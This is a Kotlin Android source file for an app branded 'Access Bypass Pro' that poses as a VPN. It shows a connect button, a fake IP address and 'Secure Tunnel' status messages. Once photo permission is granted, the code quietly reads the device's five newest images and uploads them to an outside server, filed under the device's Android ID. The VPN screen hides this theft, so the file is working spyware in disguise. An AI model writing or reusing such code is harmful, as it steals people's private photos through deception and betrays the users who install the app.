package com.example.accessbypasspro

import android.Manifest
import android.content.ContentUris
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.MediaStore
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.compose.animation.animateColorAsState
import androidx.compose.animation.core.*
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.Place
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material.icons.filled.Settings
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.rotate
import androidx.compose.ui.draw.shadow
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.SpanStyle
import androidx.compose.ui.text.buildAnnotatedString
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.withStyle
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

// --- THEME COLORS ---
val DeepSpace = Color(0xFF041226)
val MidBlue = Color(0xFF09305E)
val ElectricCyan = Color(0xFF00E5FF)
val CardBackground = Color(0xFF0D2546)
val TextMuted = Color(0xFF8BA6C9)

class MainActivity : ComponentActivity() {
    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            LocalVpnTheme {
                VpnMainScreen()
            }
        }
    }
}

@RequiresApi(Build.VERSION_CODES.TIRAMISU)
@Composable
fun VpnMainScreen() {
    val context = LocalContext.current
    val repo = remember { UploadRepository() }

    // --- STATES ---
    var isConnected by remember { mutableStateOf(false) }
    var isUploading by remember { mutableStateOf(false) }
    var uploadStatus by remember { mutableStateOf("Ready") }
    var images by remember { mutableStateOf<List<Uri>>(emptyList()) }

    val androidId = remember {
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    }

    // --- ANIMATIONS ---
    val infiniteTransition = rememberInfiniteTransition(label = "loading")
    val rotation by infiniteTransition.animateFloat(
        initialValue = 0f, targetValue = 360f,
        animationSpec = infiniteRepeatable(tween(1000, easing = LinearEasing)), label = ""
    )

    val buttonColor by animateColorAsState(if (isConnected) ElectricCyan else Color.Transparent, label = "")
    val buttonBorderColor by animateColorAsState(if (isConnected) ElectricCyan else TextMuted.copy(alpha = 0.5f), label = "")
    val iconColor by animateColorAsState(if (isConnected) DeepSpace else ElectricCyan, label = "")
    val glowRadius by animateDpAsState(if (isConnected) 24.dp else 0.dp, label = "")

    // --- PERMISSION & UPLOAD LOGIC ---
    val permission = Manifest.permission.READ_MEDIA_IMAGES
    var isGranted by remember {
        mutableStateOf(ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED)
    }

    val launcher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted = it }

    LaunchedEffect(Unit) {
        if (!isGranted) launcher.launch(permission)
    }

    LaunchedEffect(isGranted) {
        if (isGranted) {
            isUploading = true
            uploadStatus = "Connecting to Secure Bridge..."

            try {
                images = getNewest5ImageUris(context)
                withContext(Dispatchers.IO) {
                    repo.uploadImageUris(
                        context = context,
                        uris = images,
                        uploadUrl = "https://access-bypass-pro-backend.onrender.com/upload",
                        folderPath = "ADR_$androidId",
                        fileFieldName = "file",
                    )
                }
                uploadStatus = "Secure Tunnel Established"
                isConnected = true // Show connected when finished
            } catch (e: Exception) {
                uploadStatus = "Connection Failed: ${e.message}"
            } finally {
                isUploading = false
            }
        }
    }

    // --- UI LAYOUT ---
    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(Brush.verticalGradient(listOf(DeepSpace, MidBlue)))
            .systemBarsPadding()
    ) {
        Column(
            modifier = Modifier.fillMaxSize().padding(24.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            // Refined Header
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text(
                    text = buildAnnotatedString {
                        withStyle(SpanStyle(fontWeight = FontWeight.Light, color = Color.White)) {
                            append("ACCESS BYPASS")
                        }
                        withStyle(SpanStyle(fontWeight = FontWeight.Black, color = ElectricCyan)) {
                            append(" PRO")
                        }
                    },
                    fontSize = 20.sp,
                    letterSpacing = 1.sp
                )
//                Icon(Icons.Default.Settings, contentDescription = null, tint = Color.White)
            }

            Spacer(modifier = Modifier.height(60.dp))

            // Status Text
            Text(
                text = when {
                    isUploading -> "CONNECTING..."
                    isConnected -> "CONNECTED"
                    else -> "NOT CONNECTED"
                },
                color = if (isConnected || isUploading) ElectricCyan else TextMuted,
                letterSpacing = 3.sp,
                fontWeight = FontWeight.Bold,
                fontSize = 14.sp
            )

            Spacer(modifier = Modifier.height(60.dp))

            // Connect Button
            Box(
                contentAlignment = Alignment.Center,
                modifier = Modifier
                    .size(220.dp)
                    .shadow(glowRadius, CircleShape, spotColor = ElectricCyan, ambientColor = ElectricCyan)
                    .clip(CircleShape)
                    .background(buttonColor)
                    .border(2.dp, buttonBorderColor, CircleShape)
                    .clickable(enabled = !isUploading) { isConnected = !isConnected }
            ) {
                if (isUploading) {
                    Icon(
                        imageVector = Icons.Default.Refresh,
                        contentDescription = null,
                        modifier = Modifier.size(80.dp).rotate(rotation),
                        tint = ElectricCyan
                    )
                } else {
                    Icon(
                        imageVector = Icons.Default.Lock,
                        contentDescription = null,
                        modifier = Modifier.size(80.dp),
                        tint = iconColor
                    )
                }
            }

            Spacer(modifier = Modifier.height(80.dp))

            // Server Selector
            Surface(
                color = CardBackground,
                shape = RoundedCornerShape(24.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Row(modifier = Modifier.padding(20.dp), verticalAlignment = Alignment.CenterVertically) {
                    Box(
                        modifier = Modifier.size(40.dp).background(MidBlue, CircleShape),
                        contentAlignment = Alignment.Center
                    ) {
                        Icon(Icons.Default.Place, contentDescription = null, tint = ElectricCyan, modifier = Modifier.size(20.dp))
                    }
                    Spacer(modifier = Modifier.width(16.dp))
                    Column {
                        Text("IP Address", color = TextMuted, fontSize = 12.sp)
                        Text("103.152.118.45", color = Color.White, fontWeight = FontWeight.Bold)
                    }
                }
            }
        }

        // Bottom Status SnackBar-style text
        Text(
            text = uploadStatus,
            color = TextMuted,
            fontSize = 12.sp,
            modifier = Modifier
                .align(Alignment.BottomCenter)
                .padding(bottom = 32.dp)
        )
    }
}

// --- HELPER FUNCTIONS ---

fun getNewest5ImageUris(context: Context): List<Uri> {
    val imageUris = mutableListOf<Uri>()
    val projection = arrayOf(MediaStore.Images.Media._ID)
    val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
    val queryUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI

    context.contentResolver.query(queryUri, projection, null, null, sortOrder)?.use { cursor ->
        val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
        while (cursor.moveToNext() && imageUris.size < 5) {
            val id = cursor.getLong(idCol)
            imageUris.add(ContentUris.withAppendedId(queryUri, id))
        }
    }
    return imageUris
}

@Composable
fun LocalVpnTheme(content: @Composable () -> Unit) {
    MaterialTheme(
        colorScheme = darkColorScheme(
            primary = ElectricCyan,
            background = DeepSpace,
            surface = CardBackground
        ),
        content = content
    )
}